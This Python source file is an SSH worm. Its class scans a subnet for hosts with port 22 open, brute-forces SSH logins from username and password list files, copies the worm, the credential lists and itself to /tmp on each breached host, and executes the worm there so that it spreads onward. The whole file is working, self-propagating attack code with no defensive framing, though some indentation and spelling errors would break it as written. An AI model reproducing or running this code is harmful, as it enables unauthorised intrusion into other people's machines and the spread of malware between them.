import paramiko
import nmap
import socket
import os, sys

class SSHConnection:
    """ Creates an SSHConnection class. """
    def __init__(self):
        """ Initializer. Possibly add exception handling later, or just trust user """
        self.password = None
        self.username = None
        self.vulnerable_hosts = []
        self.target_host = None
        self.worm_file = None
        self.password_file = None
        self.username_file = None
        self.ssh_connection = paramiko.SSHClient()
        self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def set_password(self, password):
        self.password = password
   
    def set_username(self, username):
        self.username = username

    def set_hosts(self, new_hosts):
        self.vulnerable_hosts = new_hosts
	print (self.vulnerable_hosts)

    def set_target(self, host):
        self.target_host = host

    def set_worm_file(self, file_name):
        self.worm_file = file_name

    def set_password_file(self, file_name):
        self.password_file = file_name

    def set_username_file(self, file_name):
        self.username_file = file_name

    def get_local_ip(self):
        """ Gets current machine's ip """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 1))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip

    def retrieve_vulnerable_hosts(self, start_ip, max_ip):
        """ Retrieve list of hosts to attack, removes local computer """
	print ("getting vulnerable hosts")
	exit_code = -1
	port = 22
	hosts = [start_ip + str(i) for i in range(0, max_ip)] 
	live_hosts = []
	for host in hosts:
	    try:
	    	    ssh_sock = socket.socket()
		    ssh_sock.settimeout(20)
		    port_status = ssh_sock.connect_ex((host,port))
        	    if port_status == 0:
			live_hosts.append(host)
	    except Excption as e:
		pass
	    finally:
		ssh_sock.close()

        local_host = self.get_local_ip()
        """ Remove local host from list of target IPs """
        try:
            live_hosts.remove(local_host)
        except ValueError:
            pass
	self.vulnerable_hosts = live_hosts
	return

	"""
	port_scanner = nmap.PortScanner()
        port_scanner.scan(start_ip, arguments="-p 22 --open")
        host_info = port_scanner.all_hosts()
        live_hosts = []
        for host in host_info:
            if port_scanner[host].state() == "up":
                live_hosts.append(host)
        local_host = self.get_local_ip()

        #"" Remove local host from list of target IPs ""
        try:
            live_hosts.remove(local_host)
        except ValueError:
            pass
        self.vulnerable_hosts = live_hosts
	print ("vulnerable hosts on next time")
	print (self.vulnerable_hosts)
	"""

    def get_usernames_and_passwords(self):
        """ Returns list of strings for usernames and passwords files """
	print ("getting usernames and passwords")
        with open(self.username_file, 'r') as unames:
            usernames = unames.readlines()
        with open(self.password_file, 'r') as passwds:
            passwords = passwds.readlines()
        usernames = [username.strip() for username in usernames]
        passwords = [password.strip() for password in passwords]

        return (usernames, passwords)
	

    def brute_force_host(self, target_host, usernames, passwords):
        """ Brute forces all a host. Returns true on success """
	print ("Attacking %s " % (target_host))
        for user in usernames:
            for passwd in passwords:
		print (target_host + "  <" + user + ", " + passwd + ">")
                try:
		    #self.ssh_connection = paramiko.SSHClient()
		    #self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    self.ssh_connection.connect(target_host, username=user, password=passwd)
                    self.set_target(target_host)
                    self.set_username(user)
                    self.set_password(passwd)
		    print ("Connection established at %s" % (self.target_host))
                    return True
                except paramiko.AuthenticationException as e:
                    self.ssh_connection.close()
		    continue
		except paramiko.ssh_exception.SSHException as e:
                    self.ssh_connection.close()
		    break
		except Exception as e:
		   continue

        return False

    def find_target_host(self):
	print ("looking through hosts")
	print (self.vulnerable_hosts)
        usernames, passwords = self.get_usernames_and_passwords()
        for host in self.vulnerable_hosts:
            self.brute_force_host(host, usernames, passwords)
	    if self.username is not None:
                self.place_worm()
             	self.check_if_marked()
                return
            else:
                continue
	    print (host)
	""" No host found """
	print ("No host could be connected to")
	sys.exit()

    def check_if_marked(self):
	print ("checking if marked")
        stdin, stdout, stderr = self.ssh_connection.exec_command("ls /tmp/")
        results = stdout.readlines()
        results = [str(name) for name in results]
        results = [name[0:-1] for name in results]
        if self.worm_file in results:
            """ System is already infected, moving on """
            return True
        else:
            return False

    def place_worm(self):
	print ("placing worm") 
        sftp_client = self.ssh_connection.open_sftp()
        sftp_client.put(self.worm_file, "/tmp/" + self.worm_file)
        sftp_client.put(self.password_file, "/tmp/" + self.password_file)
        sftp_client.put(self.username_file, "/tmp/" + self.username_file)
	sftp_client.put(__name__ + ".py", "/tmp/" + __name__ + ".py")
	self.ssh_connection.exec_command("chmod 777 /tmp/ " + self.worm_file)

    def start_attack(self):
	print ("starting attack")
	marker = self.get_local_ip()
	self.ssh_connection.exec_command("echo " + marker + " >> gotcha.txt")
        self.ssh_connection.exec_command("python /tmp/" + self.worm_file)
